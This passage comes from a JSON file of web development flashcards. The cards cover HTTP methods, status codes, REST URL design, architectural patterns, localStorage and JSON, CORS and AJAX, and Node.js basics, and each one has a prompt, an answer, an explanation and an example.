once.","example":"DELETE /patients/1 called 10 times: patient #1 is deleted after the first call. The remaining 9 calls find nothing to delete — same final state.","source":"Slide 8","bloom":"understand"},{"id":"rest-anatomy-card-05","type":"predict","prompt":"Which HTTP method should you use to send 1 GB of data to a server?","answer":"POST","explanation":"GET appends data to the URL, which has a length limit enforced by browsers and servers. POST places data in the request body, which has no size limit.","example":"Uploading a large file: POST /files/ with the file data in the body.","source":"Slide 8, Quiz 6, Quiz 7","bloom":"apply","lang":"js"},{"id":"rest-anatomy-card-06","type":"predict","prompt":"A user edits their profile on a social network. All fields are replaced with the new values. Which HTTP method is correct?","answer":"PUT","explanation":"PUT replaces the entire resource. When all fields are being replaced, PUT is the correct method. Use PATCH only when updating a subset of fields.","example":"PUT /users/99 with the full updated profile object.","source":"Slide 8, Quiz 7","bloom":"apply","lang":"js"},{"id":"rest-anatomy-card-07","type":"name","prompt":"What status code does a server return when a new resource is successfully created?","answer":"201 Created","explanation":"201 Created signals that a new resource was created. It is returned after a successful POST or some PUT requests. A plain 200 OK means success without creation.","example":"POST /patients/ → 201 Created with Location: /patients/42/","source":"Slide 8","bloom":"remember"},{"id":"rest-anatomy-card-08","type":"predict","prompt":"Is it safe to send a username and password using GET? Why or why not?","answer":"No. GET data appears in the URL, exposing credentials in browser history, server logs, and proxy logs.","explanation":"GET appends data as query parameters in the URL. That URL is visible in browser history, server access logs, and any network intermediary. Credentials sent via GET are not confidential.","example":"GET /login?username=alice&password=secret123 — the password is visible in the URL bar and logs.","source":"Slide 8, Quiz 7","bloom":"analyze","lang":"js"},{"id":"rest-anatomy-card-09","type":"cloze","prompt":"Status codes in the {{4xx}} range indicate client errors.","answer":"4xx","explanation":"The first digit of a status code indicates the category: 1xx informational, 2xx success, 3xx redirect, 4xx client error, 5xx server error. A 404 Not Found and 401 Unauthorized are both client errors.","example":"404 Not Found: the client requested a resource that does not exist.","source":"Slide 8","bloom":"remember"},{"id":"rest-anatomy-card-10","type":"name","prompt":"Name the two types of headers in an API call and one example of each.","answer":"Request headers (e.g., API-key) and response headers (e.g., content-type).","explanation":"Request headers carry metadata from client to server: the API key identifies the caller, count and pageNo control pagination. Response headers carry metadata back: status is the HTTP code, content-type describes the resource format.","example":"Request header: API-Key: abc123. Response header: Content-Type: application/json.","source":"Slide 3","bloom":"understand"},{"id":"rest-anatomy-card-11","type":"cloze","prompt":"GET responses can be {{cached}} by the browser; POST responses cannot.","answer":"cached","explanation":"Browsers and CDNs cache GET responses because GET is safe and idempotent — the same request reliably returns the same resource. POST changes server state, so caching the response would be incorrect.","example":"GET /patients/ returns a cached list on the second call. POST /patients/ always hits the server to create a new record.","source":"Slide 8, Quiz 6","bloom":"understand"},{"id":"rest-anatomy-card-12","type":"predict","prompt":"Which HTTP method do you use to delete patient #5 from the system?","answer":"DELETE /patients/5/","explanation":"DELETE removes the specified resource. It requires only the resource identifier in the URL. No request body is needed.","example":"DELETE https://api.example.com/v1/patients/5/","source":"Slide 8","bloom":"apply","lang":"js"}]},{"id":"web-arch-patterns","name":"Architectural Patterns","tags":["monolithic","layered","MSA","SOA","serverless","FaaS","MVC","MVVM"],"prose":"Architectural patterns including monolithic, layered (n-tier), MSA/SOA, serverless/FaaS, MVC, and MVVM — each with distinct trade-offs for scalability and independent deployment.","cards":[{"id":"web-arch-patterns-card-01","type":"name","prompt":"What architectural pattern bundles all application logic — UI, business logic, and data access — into a single deployable unit?\n","answer":"Monolithic architecture","explanation":"Monolithic architecture treats the entire application as one piece. All code compiles together, deploys together, and runs on one process. This makes it simple to start but expensive to change as complexity grows.\n","example":"A small e-commerce site where routing, product logic, and database queries all live in one Express app is monolithic. Deploying a coupon feature requires shutting down the entire site.\n","source":"Slide 2","bloom":"remember"},{"id":"web-arch-patterns-card-02","type":"cloze","prompt":"In monolithic architecture, adding a new feature requires three steps: (1) {{shut down}} the entire application, (2) add the feature, (3) {{recompile}} before redeploying.\n","answer":"(1) shut down; (3) recompile","explanation":"Because all code is bundled together, the whole system must stop before any part of it changes. MSA avoids this by letting you redeploy individual services without touching others.\n","example":"Compare to MSA: Netflix can push a fix to its recommendation service while video streaming and billing continue running uninterrupted.\n","source":"Slide 2","bloom":"remember"},{"id":"web-arch-patterns-card-03","type":"name","prompt":"Name the four layers of layered (n-Tier) architecture, from top to bottom.\n","answer":"Presentation Layer, Business Layer, Application Layer, Data Access Layer","explanation":"Each layer handles one functional concern. Presentation handles UI; Business handles logic and decisions; Application holds shared libraries; Data Access handles database reads and writes. Strict layer boundaries enforce separation of concerns.\n","example":"In a banking app, the Business Layer checks authorization before the Data Access Layer executes any SQL — no UI code ever touches financial records directly.\n","source":"Slide 2","bloom":"remember"},{"id":"web-arch-patterns-card-04","type":"cloze","prompt":"In layered architecture, the {{Business Layer}} controls the application's logic, decision making, and routing of requests.\n","answer":"Business Layer","explanation":"The Business Layer sits between the Presentation Layer and the Application Layer. It is where authorization decisions, workflow logic, and request routing live — keeping these concerns out of both the UI and the database code.\n","example":"\"Should this user be allowed to transfer funds?\" — that question is answered in the Business Layer, not in the Presentation Layer that received the button click.\n","source":"Slide 2","bloom":"remember"},{"id":"web-arch-patterns-card-05","type":"name","prompt":"MSA stands for ________ Architecture. What is the equivalent term on the slides, and how do they differ in this course?\n","answer":"MSA = Microservice Architecture. SOA = Service-Oriented Architecture. In this course they refer to the same thing — do not contrast them.\n","explanation":"The slides explicitly note: \"MSA: Microservice Architecture / SOA: Service-Oriented Architecture — slightly different but refer the same thing in this course.\" Treating SOA as a predecessor or separate pattern is incorrect in this context.\n","example":"Messenger (MSA service) runs independently from Facebook's core app. Either \"MSA\" or \"SOA\" would be correct labels for that relationship in COMP4537.\n","source":"Slide 2","bloom":"understand"},{"id":"web-arch-patterns-card-06","type":"name","prompt":"In MSA, services communicate with each other exclusively through what mechanism? Name one consequence of this constraint.\n","answer":"Services communicate only via API calls. Consequence: high-frequency inter-service communication generates many network round-trips, increasing latency compared to in-process calls in a monolith.\n","explanation":"API-only communication enforces loose coupling — no service can reach into another service's database or memory directly. This independence enables independent deployment but adds network overhead.\n","example":"In the COMP4537 API-centric MSA diagram, the client hits an API gateway, which routes requests to separate services in Japan, USA, UAE, and Korea — every hop is an API call returning JSON.\n","source":"Slide 2","bloom":"understand"},{"id":"web-arch-patterns-card-07","type":"name","prompt":"What architectural pattern runs small, stateless functions in the cloud without the developer managing server infrastructure?\n","answer":"Serverless / Function-as-a-Service (FaaS)","explanation":"In serverless architecture, a cloud provider handles all infrastructure: provisioning, scaling, and patching. The developer writes only the function logic and defines the API contract. \"The server is developed by someone else and made available via API calls.\"\n","example":"Sending an API request to an image-processing service that resizes and crops photos is serverless from the caller's perspective — no server to provision, pay for when idle, or patch.\n","source":"Slide 2","bloom":"remember"},{"id":"web-arch-patterns-card-08","type":"name","prompt":"MVC stands for what three components, and what is each component responsible for?\n","answer":"Model (data and business rules), View (UI rendering), Controller (receives input, coordinates Model and View).\n","explanation":"MVC separates the three concerns that recur in every UI-driven application: what data exists, how it is displayed, and how user actions change it. Keeping them separate makes each component independently testable and replaceable.\n","example":"GitHub was originally built on Ruby on Rails, an MVC framework. The \"repository\" object is the Model; the HTML page displaying commits is the View; the endpoint handling a push event is the Controller.\n","source":"Slide 2","bloom":"remember"},{"id":"web-arch-patterns-card-09","type":"cloze","prompt":"MVVM improves on MVC by adding {{two-way data binding (via a ViewModel)}}, which synchronizes the View and Model automatically without the developer writing explicit event handlers.\n","answer":"two-way data binding (via a ViewModel)","explanation":"In MVVM, the ViewModel exposes data streams. When either the View or the Model changes, the ViewModel propagates the update in both directions automatically. This is why frameworks like Angular and Vue are described as MVVM-based.\n","example":"In a Vue form, editing an input field immediately updates the underlying data object and re-renders any computed display — no `addEventListener` required.\n","source":"Slide 2","bloom":"understand"},{"id":"web-arch-patterns-card-10","type":"name","prompt":"You are designing a system for a large company where multiple teams each own a distinct function (payments, inventory, notifications). Deployments must be independent. Which architectural pattern fits, and name two companies that use it?\n","answer":"MSA (Microservice Architecture). Companies: any two from Uber, Netflix, Amazon, eBay, SoundCloud, Groupon, realtor.com.\n","explanation":"MSA lets each team own, deploy, and scale their service independently. The coordination cost is API contracts between services — the benefit is that no team blocks another's deployment cycle.\n","example":"Amazon's checkout service, recommendation engine, and inventory tracker are separate MSA services. A bug in recommendations does not halt checkout.\n","source":"Slide 2","bloom":"analyze"}]},{"id":"json-localstorage","name":"JSON and Web Storage","tags":["localStorage","JSON","origin","sessionStorage"],"prose":"JSON stringify/parse for object serialization, localStorage versus sessionStorage lifecycle, and web storage origin scope (protocol + domain + port).","cards":[{"id":"json-localstorage-card-01","type":"name","prompt":"What method retrieves a value from localStorage by key?","answer":"`localStorage.getItem(key)`","explanation":"`getItem` takes a string key and returns the stored string, or `null` if the key does not exist. There is no `.get()` method.","example":"`window.localStorage.getItem('token')` returns the string stored under `'token'`.","source":"Quiz 5 Q1","bloom":"remember"},{"id":"json-localstorage-card-02","type":"cloze","prompt":"localStorage stores data with {{no expiration date}}, while sessionStorage stores data only until {{the browser tab is closed}}.","answer":"no expiration date; the browser tab is closed","explanation":"localStorage persists indefinitely until explicitly removed. sessionStorage is cleared automatically when the tab closes.","example":"A shopping-cart preference saved in localStorage survives browser restarts. A multi-step form's current page saved in sessionStorage is lost when the tab closes.","source":"Slide 2","bloom":"remember"},{"id":"json-localstorage-card-03","type":"cloze","prompt":"Web storage is scoped to the {{origin}} (the combination of {{protocol}}, {{domain}}, and {{port}}).","answer":"origin; protocol; domain; port","explanation":"Two pages share localStorage only when all three components match exactly. The path component is irrelevant.","example":"`http://myDomain.com/a.html` and `http://myDomain.com/b.html` share the same origin. `https://myDomain.com/a.html` does not — different protocol.","source":"Slide 2, Quiz 5 Q2, Q6, Exam-strategy pitfall 3","bloom":"understand"},{"id":"json-localstorage-card-04","type":"name","prompt":"What does `JSON.stringify()` do?","answer":"Converts a JavaScript object into a JSON string.","explanation":"The resulting string is flat text that can be stored in localStorage, sent over a network, or written to a file. `JSON.parse()` reverses the operation.","example":"`JSON.stringify({ name: 'Alice' })` → `'{\"name\":\"Alice\"}'`","source":"Slide 2, Slide 3","bloom":"remember"},{"id":"json-localstorage-card-05","type":"name","prompt":"What does `JSON.parse()` do?","answer":"Converts a JSON string back into a JavaScript object.","explanation":"It reconstructs the full object, including nested properties and arrays. The inverse of `JSON.stringify()`.","example":"`JSON.parse('{\"name\":\"Alice\"}')` → `{ name: 'Alice' }`","source":"Slide 2, Slide 3","bloom":"remember"},{"id":"json-localstorage-card-06","type":"name","prompt":"What method removes all items from localStorage for the current origin?","answer":"`localStorage.clear()`","explanation":"`clear()` deletes every key-value pair in the storage bucket for that origin. `removeItem(key)` deletes only one key. There is no `clearAll()` or `removeAll()` method.","example":"`window.localStorage.clear()` empties all stored data.","source":"Slide 2, Quiz 5 Q7","bloom":"remember"},{"id":"json-localstorage-card-07","type":"predict","prompt":"```js\nlocalStorage.setItem('color', 'blue');\nconst value = localStorage.getItem('color');\nlocalStorage.removeItem('color');\nlocalStorage.setItem('color', 'red');\nconsole.log(value);\n```\nWhat does `console.log(value)` print?\n","answer":"`'blue'`","explanation":"`getItem` returned the string `'blue'` at the moment it was called and assigned it to `value`. Subsequent changes to localStorage do not retroactively update `value`.","example":"Variables hold values, not references to storage slots. Reassigning localStorage does not reach back into existing variables.","source":"Quiz 5 Q3","bloom":"apply","lang":"js"},{"id":"json-localstorage-card-08","type":"predict","prompt":"Can `https://lab.aaa.com/1/index.html` read localStorage written by `https://aaa.com/labs/1/index.html`?\n","answer":"No.","explanation":"`lab.aaa.com` is a different subdomain from `aaa.com`. Subdomains are distinct origins — they do not share localStorage even if the top-level domain is the same.","example":"Quiz 5 Q6: the correct accessor is `https://aaa.com/labs/5/hello.html` (same origin) — not `https://lab.aaa.com/1/index.html`.","source":"Quiz 5 Q6, Exam-strategy pitfall 3","bloom":"apply","lang":"js"},{"id":"json-localstorage-card-09","type":"name","prompt":"Where in Chrome DevTools can you inspect localStorage entries?","answer":"Application tab → Storage → Local Storage","explanation":"The Application tab centralizes all client-side storage types: localStorage, sessionStorage, cookies, IndexedDB, and more.","example":"Open DevTools (F12), click the Application tab, expand Local Storage, select the origin.","source":"Quiz 5 Q9","bloom":"remember"},{"id":"json-localstorage-card-10","type":"cloze","prompt":"Is nesting objects inside JSON valid? `{\"user\": {\"profile\": {\"name\": \"Alice\"}}}` is {{valid}} JSON.","answer":"valid","explanation":"JSON supports arbitrary nesting of objects and arrays. A common misconception is that JSON must be flat — this is false.","example":"`JSON.stringify({ user: { profile: { name: 'Alice' } } })` produces valid JSON and `JSON.parse` reconstructs it correctly.","source":"Quiz 5 Q10","bloom":"understand"},{"id":"json-localstorage-card-11","type":"name","prompt":"Which JSON method does NOT exist as a built-in?","answer":"`JSON.convert()` — it does not exist.","explanation":"The only two built-in JSON methods are `JSON.stringify()` and `JSON.parse()`. Calling `JSON.convert()` throws `TypeError: JSON.convert is not a function`.","example":"Quiz 5 Q8: `JSON.parse()` and `JSON.stringify()` are real; `JSON.convert()` is not.","source":"Quiz 5 Q8","bloom":"remember"},{"id":"json-localstorage-card-12","type":"predict","prompt":"Is localStorage data stored in Chrome accessible from Firefox on the same computer?\n","answer":"No.","explanation":"localStorage is browser-specific. Chrome and Firefox each maintain separate storage buckets. Data is not shared across browsers even on the same machine.","example":"Quiz 5 Q5: `'Data stored in local storage is persistent between different browsers'` → False.","source":"Quiz 5 Q5","bloom":"understand","lang":"js"},{"id":"json-localstorage-card-13","type":"cloze","prompt":"To store a JS object `obj` in localStorage under key `'data'`, write: `localStorage.setItem('data', {{JSON.stringify(obj)}})`.","answer":"`JSON.stringify(obj)`","explanation":"localStorage only stores strings. Passing an object directly coerces it to `'[object Object]'`. `JSON.stringify` produces a proper string representation.","example":"`localStorage.setItem('user', JSON.stringify({ name: 'Alice', role: 'admin' }))`","source":"Slide 2","bloom":"apply"}]},{"id":"restful-url-design","name":"RESTful URL Design and API Versioning","tags":["REST","URL-design","versioning","plural-nouns","URI"],"prose":"RESTful URLs use plural nouns to name resource collections, path parameters to address individual resources, and the HTTP method — not a verb in the URI — to express the action. API versioning in the URI path allows an API to evolve without breaking existing clients.","cards":[{"id":"restful-url-design-card-01","type":"cloze","prompt":"RESTful APIs name resource collections with {{plural nouns}}. A collection of patients lives at `/patients`; one patient lives at `/patients/{{id}}`.","answer":"plural nouns; id","explanation":"Plural nouns signal a collection. Appending an ID segment narrows the address to one item. The HTTP method then expresses what to do with that item.","example":"`/orders` is the collection. `/orders/42` is order number 42.","source":"Slide 11","bloom":"remember"},{"id":"restful-url-design-card-02","type":"name","prompt":"What is wrong with the URI `/getPatient/1` in a RESTful API?","answer":"It uses a verb in the URI. The correct form is `/patients/1` — the HTTP method (`GET`) expresses the action.","explanation":"REST's uniform-interface constraint requires that the URI identify a resource, not describe an operation. HTTP methods supply the operation. Mixing verbs into paths forces a new URI for every action.","example":"Wrong: `GET /getPatient/1`. Correct: `GET /patients/1`.","source":"Slide 11","bloom":"understand"},{"id":"restful-url-design-card-03","type":"cloze","prompt":"POST /orders {{creates a new resource}}; PUT /orders/1 {{replaces an existing one}}.","answer":"creates a new resource; replaces an existing one","explanation":"POST targets the collection and appends a new item. PUT targets a specific URI and replaces the entire resource at that address. Confusing them sends the wrong HTTP method to the wrong endpoint.","example":"`POST /patients` — body contains new patient data, server assigns the ID. `PUT /patients/7` — body contains the complete replacement for patient 7.","source":"Slide 8","bloom":"remember"},{"id":"restful-url-design-card-04","type":"name","prompt":"Where does the version number belong in a RESTful URI, and what does the unversioned path point to?","answer":"The version belongs in the URI path, e.g. `/v1/catalog`. The unversioned path `/catalog` redirects to the latest version using an HTTP 3xx status code.","explanation":"Placing the version in the URI makes versioning explicit and stable. The unversioned path acts as a convenience pointer so callers who always want the latest do not need to track the current version number.","example":"`/v1/patients/` is pinned to version 1. `/patients/` redirects to `/v2/patients/` when v2 becomes latest.","source":"Slide 11","bloom":"understand"},{"id":"restful-url-design-card-05","type":"cloze","prompt":"API versioning should be introduced {{before the first public release}}, not added retroactively, because adding it later {{breaks existing clients}} that are already calling the unversioned path.","answer":"before the first public release; breaks existing clients","explanation":"Clients that start calling `/patients/1` on day one have no version prefix baked in. Inserting `/v1/` later forces every client to update their endpoint strings — that change is itself a breaking change.","example":"Client code: `fetch('/patients/1')`. After adding versioning: `fetch('/v1/patients/1')`. Every client must update.","source":"Slide 11","bloom":"understand"},{"id":"restful-url-design-card-06","type":"name","prompt":"Name three situations that require releasing a new API version.","answer":"1. The format of the response data changes. 2. A field type changes (e.g., integer to float). 3. An endpoint is removed or its behaviour fundamentally changes.","explanation":"These are all breaking changes — existing clients that parse the response or call the endpoint will fail without modification. Non-breaking additions (new optional fields, new endpoints) do not require a new version.","example":"Changing a patient's `age` field from integer to a string `'28 years'` breaks clients that do arithmetic on it. That requires v2.","source":"Slide 11","bloom":"understand"},{"id":"restful-url-design-card-07","type":"cloze","prompt":"In a URI, the {{query string}} — the `?key=value` portion — passes values to customize output, while the {{URI path}} identifies which resource is being addressed.","answer":"query string; URI path","explanation":"Path encodes identity; query string encodes customization. Use path parameters for `GET /patients/1` (identity) and query strings for `GET /patients?page=2&limit=10` (filtering).","example":"`http://example.com/api/orders/1?format=summary` — path identifies order 1; query string requests summary format.","source":"Slide 11","bloom":"remember"},{"id":"restful-url-design-card-08","type":"name","prompt":"A client always wants the latest version of your API without updating their code. What URI design pattern supports this?","answer":"An unversioned path (e.g., `/catalog`) that redirects to the latest version (e.g., `/v2/catalog`) using an HTTP 3xx status code.","explanation":"The redirect approach lets the server advance the latest pointer without changing what the client calls. The client follows the redirect automatically. Clients that need stability should pin to a versioned URI.","example":"`GET /catalog` → `302 Found` → `Location: /v2/catalog`. The client follows and gets the v2 response.","source":"Slide 11","bloom":"apply"},{"id":"restful-url-design-card-09","type":"cloze","prompt":"The REST recommendation from Slide 11 is to use {{plural nouns}} for defining resources, because the same path then serves both the {{collection}} (all items) and a {{single item}} (by appending `/{id}`).","answer":"plural nouns; collection; single item","explanation":"A plural noun reads naturally as a collection: `/patients` means 'all patients.' Appending an ID narrows to one: `/patients/42` means 'patient 42.' Singular nouns break this symmetry — `/patient` cannot cleanly represent the collection.","example":"`/orders` → list all orders. `/orders/5` → order #5 specifically.","source":"Slide 11","bloom":"remember"}]},{"id":"modern-web-arch","name":"Modern Web Architecture Trends","tags":["serverless","headless","DDD","DOMA","edge-computing","API-first","AIaaS"],"prose":"Modern architectural trends including serverless, headless architecture, DDD/DOMA, edge computing, API-first development, and AI-as-a-Service.","cards":[{"id":"modern-web-arch-card-01","type":"cloze","prompt":"AI-as-a-Service (AIaaS) means cloud providers expose {{pre-trained AI models}} as API-accessible services. Examples include Google Cloud AI, {{AWS AI Services}}, and Azure Cognitive Services.\n","answer":"pre-trained AI models; AWS AI Services","explanation":"AIaaS removes the need to build or train models from scratch. Developers call an API endpoint and receive AI results (image classification, language processing, speech transcription). The model infrastructure is entirely managed by the provider.\n","example":"A web app that calls the AWS Rekognition API to detect faces in uploaded photos is using AIaaS — no ML training pipeline required.\n","source":"Slide 8","bloom":"remember"},{"id":"modern-web-arch-card-02","type":"name","prompt":"What is the mechanism behind edge computing, and what problem does it solve?\n","answer":"Edge computing processes data closer to the source (user's device or regional node) rather than in a centralized data center. It solves high latency caused by long-distance round-trips between users and central servers.\n","explanation":"By moving compute to nodes geographically close to users, edge computing cuts the physical distance data must travel. Shorter distance means lower latency and faster response — critical for real-time applications, IoT telemetry, and low-latency gaming.\n","example":"A CDN that processes image transformations at a regional edge node near the user, rather than routing to a central data center on another continent, is applying edge computing.\n","source":"Slide 8","bloom":"understand"},{"id":"modern-web-arch-card-03","type":"name","prompt":"What does headless architecture decouple, and what is the primary benefit for organizations with multiple frontend clients?\n","answer":"Headless architecture decouples the frontend presentation layer from the backend data and logic layers. The benefit: multiple frontends (web, mobile, IoT) can consume the same backend API without the backend containing any frontend-specific logic.\n","explanation":"In a traditional CMS, the backend controls both content storage and HTML rendering. A headless CMS handles only content storage and delivers it via API. Frontend teams choose any rendering technology; the backend is unchanged.\n","example":"A news organization's website, mobile app, and smart-TV interface all call the same headless CMS API to retrieve articles. Each frontend renders content differently without requiring separate backends.\n","source":"Slide 8","bloom":"understand"},{"id":"modern-web-arch-card-04","type":"name","prompt":"What core concept does Domain-Driven Design (DDD) use to enforce separation of concerns between business domains in a large system?\n","answer":"Bounded contexts. Each business domain is isolated within a boundary where its model is consistent and a team has clear ownership. Changes inside one bounded context do not affect others.\n","explanation":"DDD recognizes that large systems contain multiple business domains (payments, inventory, recommendations) that have different rules and language. Bounded contexts prevent domain models from bleeding into each other, making the system easier to change and reason about.\n","example":"In an e-commerce system, the \"order\" concept in the payments domain means something different than \"order\" in the warehouse domain. DDD gives each domain its own bounded context so both definitions coexist without collision.\n","source":"Slide 8","bloom":"understand"},{"id":"modern-web-arch-card-05","type":"name","prompt":"What problem did Uber face that motivated DOMA (Domain-Oriented Microservice Architecture), and what structural change did DOMA introduce?\n","answer":"Uber's MSA grew to hundreds of services with overlapping responsibilities and no clear boundaries. Maintaining consistency, scaling, and collaboration became difficult. DOMA reorganized services into domain groups, each with clear ownership and a domain-level API boundary.\n","explanation":"Raw MSA at scale produces coordination failures: teams don't know which service owns what, duplicated logic accumulates, and changes have unpredictable blast radius. DOMA applies DDD's bounded-context thinking to service organization, restoring clarity at the organizational level.\n","example":"After DOMA, Uber's \"maps\" domain group owns all location and routing services under one boundary. Other domains call the maps domain API rather than reaching into individual map services directly.\n","source":"Slide 8","bloom":"understand"},{"id":"modern-web-arch-card-06","type":"cloze","prompt":"In serverless architecture, the developer is responsible only for {{the function logic (and API contract)}}. The cloud provider automatically handles {{deployment}}, scaling, and server management.\n","answer":"the function logic (and API contract); deployment","explanation":"\"Serverless\" describes who manages infrastructure, not whether infrastructure exists. Servers still run the code — AWS, Azure, or GCP manages them. The developer never provisions, patches, or scales servers; those concerns are fully delegated to the provider.\n","example":"An AWS Lambda function that resizes uploaded images runs on real AWS servers. The developer writes only the resize logic; AWS handles everything else. At zero traffic, zero servers are allocated and no cost accrues.\n","source":"Slide 8","bloom":"remember"},{"id":"modern-web-arch-card-07","type":"name","prompt":"A developer uses Google AutoML to fine-tune an image classifier without writing any ML training code. What broader category of tooling does this represent, and name two other platforms in the same category?\n","answer":"AutoML / no-code AI. Other platforms: HuggingFace, Kaggle.\n","explanation":"AutoML platforms abstract the ML engineering layer. Users provide labeled data and configure training runs; the platform handles architecture search, training, and deployment. This extends AIaaS downward — not just consuming pre-trained models, but customizing them without deep ML expertise.\n","example":"A retail company uses Google AutoML Vision to train a product defect detector from 2,000 labeled photos. No ML engineer on staff — the platform produces a deployable model endpoint the web team calls via API.\n","source":"Slide 8","bloom":"understand"}]}]},{"id":"m3-nodejs-server-development","name":"Node.js and Server-Side Development","topics":[{"id":"ajax-cors","name":"AJAX, CORS, and Same-Origin Policy","tags":["AJAX","CORS","SOP","preflight","OPTIONS","XMLHttpRequest","readyState"],"prose":"AJAX lets browser scripts send HTTP requests without page reloads, using XMLHttpRequest. The Same-Origin Policy blocks cross-origin reads; CORS lets the server explicitly permit them via response headers. readyState transitions 0–4; DONE is 4. Preflight (OPTIONS) fires before non-simple cross-origin requests.\n","cards":[{"id":"ajax-cors-card-01","type":"cloze","bloom":"remember","source":"Slide 5","prompt":"readyState {{4}} means the XMLHttpRequest operation is DONE.","answer":"4","explanation":"readyState values are 0 (UNSENT) through 4 (DONE). DONE is 4, not 5. This is a direct exam trap documented in domain-specific pitfalls.\n","example":"if (this.readyState == 4 && this.status == 200) { ... }"},{"id":"ajax-cors-card-02","type":"cloze","bloom":"remember","source":"Slide 5","prompt":"The four readyState values in order are: 0=UNSENT, 1=OPENED, 2={{HEADERS_RECEIVED}}, 3=LOADING, 4=DONE.\n","answer":"HEADERS_RECEIVED","explanation":"State 2 fires when send() has been called and the server has returned response headers, before the body arrives.\n","example":"case 2: console.log('Headers available');"},{"id":"ajax-cors-card-03","type":"name","bloom":"remember","source":"Slide 5","prompt":"What does SOP stand for, and what does it do?","answer":"Same-Origin Policy — a browser rule that blocks scripts from reading cross-origin responses.","explanation":"Origin = protocol + domain + port. SOP compares the document origin to the request target origin and blocks reads when they differ.\n","example":"http://localhost:3000 vs http://localhost:8000 — different ports = different origins."},{"id":"ajax-cors-card-04","type":"name","bloom":"understand","source":"Slide 5","prompt":"What header must a server include to allow any origin to read its AJAX response?","answer":"Access-Control-Allow-Origin: *","explanation":"CORS is configured server-side via response headers. The wildcard value permits all origins. A specific origin value restricts access to that origin only.\n","example":"res.setHeader(\"Access-Control-Allow-Origin\", \"*\");"},{"id":"ajax-cors-card-05","type":"predict","bloom":"apply","source":"Slide 5, Quiz 6","prompt":"What does the browser do when this handler fires?\n```js\nif (this.readyState == 4 && this.status == 200) {\n  document.getElementById(\"demo\").innerHTML = this.responseText;\n}\n```\n","answer":"Writes the response text into the #demo element. Fires only when the request is complete (readyState 4) and successful (HTTP 200).","explanation":"The double condition guards against partial states (readyState 1–3) and failed requests (non-200 status codes). Both must be true to act.\n","example":"Standard AJAX success handler pattern from Slide 5.","lang":"js"},{"id":"ajax-cors-card-06","type":"name","bloom":"understand","source":"Slide 5","prompt":"What triggers a preflight request?","answer":"A cross-origin request using a non-simple method (anything other than GET/POST) or a custom request header.\n","explanation":"The browser sends an OPTIONS preflight first to ask the server whether it permits the intended method/headers from this origin. Simple GET and form-encoded POST do not trigger preflight.\n","example":"DELETE, PUT, or a JSON Content-Type header on a cross-origin POST all trigger preflight."},{"id":"ajax-cors-card-07","type":"cloze","bloom":"understand","source":"Slide 5","prompt":"A preflight is an {{OPTIONS}} request the browser sends before a non-simple cross-origin request to verify server permissions.\n","answer":"OPTIONS","explanation":"OPTIONS is an HTTP method used to describe the communication options for a target resource. Browsers use it for CORS negotiation.\n","example":"OPTIONS /api/data HTTP/1.1  Origin: http://localhost:3000"},{"id":"ajax-cors-card-08","type":"name","bloom":"remember","source":"Slide 5","prompt":"What is an origin, precisely?","answer":"Protocol + domain + port — all three must match for two URLs to share the same origin.","explanation":"Changing any single component creates a different origin. http vs https = different. port 3000 vs port 8000 = different. lab.example.com vs example.com = different.\n","example":"http://localhost:3000 and https://localhost:3000 are different origins."},{"id":"ajax-cors-card-09","type":"predict","bloom":"apply","source":"Slide 5","prompt":"A script on http://localhost:3000 calls:\n```js\nxhttp.withCredentials = true;\n```\nand the server responds with `Access-Control-Allow-Origin: *`.\nWhat happens?\n","answer":"The browser rejects the response. withCredentials requires a specific origin in Access-Control-Allow-Origin, not the wildcard.","explanation":"Credentials (cookies, Authorization headers) and the wildcard origin are mutually exclusive. The server must name the specific allowed origin.\n","example":"Access-Control-Allow-Origin: http://localhost:3000  (not *)","lang":"js"},{"id":"ajax-cors-card-10","type":"name","bloom":"remember","source":"Quiz 6","prompt":"Which HTTP method can be bookmarked? GET or POST?","answer":"GET — query parameters sit in the URL, making it bookmarkable. POST data is in the body and cannot be bookmarked.","explanation":"GET requests encode parameters in the URL. POST requests place data in the request body with content-type application/x-www-form-urlencoded.\n","example":"GET /search?q=ajax vs POST /search (body: q=ajax)"},{"id":"ajax-cors-card-11","type":"predict","bloom":"analyze","source":"ISAQuiz7 Q4","prompt":"A student writes:\n```js\nconst server = http.createServer((req, res) =\u003e {\n  req.writeHead(200, { \"Content-Type\": \"text/html\" });\n  req.write(\"\u003ch1\u003eHello\u003c/h1\u003e\");\n  req.end();\n});\n```\nWhat is wrong?\n","answer":"req is the incoming request stream — it has no writeHead, write, or end methods. All three calls must use res (the response object).","explanation":"http.createServer passes (req, res). req is readable (incoming data). res is writable (outgoing response). Calling write methods on req throws.\n","example":"Correct: res.writeHead(200, ...); res.write(...); res.end();","lang":"js"},{"id":"ajax-cors-card-12","type":"cloze","bloom":"apply","source":"Slide 5","prompt":"The AJAX four-step lifecycle is: (1) create XMLHttpRequest, (2) attach {{onreadystatechange}} handler, (3) call open(), (4) call send().\n","answer":"onreadystatechange","explanation":"The handler must be attached before open() and send() so it is registered before any state transitions can fire.\n","example":"xhttp.onreadystatechange = function() { if (this.readyState == 4 ...) { ... } };"},{"id":"ajax-cors-card-13","type":"name","bloom":"understand","source":"Slide 5","prompt":"Who configures CORS — the browser, the client script, or the server?","answer":"The server — CORS is implemented by adding Access-Control-Allow-* headers to the HTTP response.","explanation":"SOP is enforced by the browser. CORS is the server's mechanism to signal that cross-origin access is permitted. The client script has no control over it.\n","example":"res.setHeader(\"Access-Control-Allow-Origin\", \"*\");  // server-side"},{"id":"ajax-cors-card-14","type":"predict","bloom":"analyze","source":"Slide 5","prompt":"readyState is 2. What has just happened?","answer":"send() was called and the server returned response headers. The body has not yet arrived.","explanation":"State 2 (HEADERS_RECEIVED) means the HTTP response headers are available via getResponseHeader(), but responseText is not yet populated.\n","example":"xhttp.getResponseHeader('Content-Type') is usable at readyState 2.","lang":"js"},{"id":"ajax-cors-card-15","type":"name","bloom":"remember","source":"Slide 5","prompt":"What does the withCredentials flag on XMLHttpRequest do?","answer":"Includes cookies and Authorization headers in cross-origin requests. Requires the server to name a specific origin (not *) and set Access-Control-Allow-Credentials: true.","explanation":"Without withCredentials = true, cross-origin requests strip cookies and auth headers. With it, the browser sends them but enforces stricter CORS rules.\n","example":"xhttp.withCredentials = true;"}]},{"id":"nodejs-basics","name":"Node.js runtime and single-threaded non-blocking model","tags":["nodejs","async","non-blocking","V8","server-scripting"],"prose":"Node.js is a back-end JavaScript runtime built on the Chrome V8 engine. It runs single-threaded non-blocking, handling many concurrent requests via the event loop instead of creating one thread per request.\n","source":"Slide 4, Quiz 7","cards":[{"id":"nodejs-basics-card-01","type":"cloze","prompt":"Node.js is built on {{Chrome V8 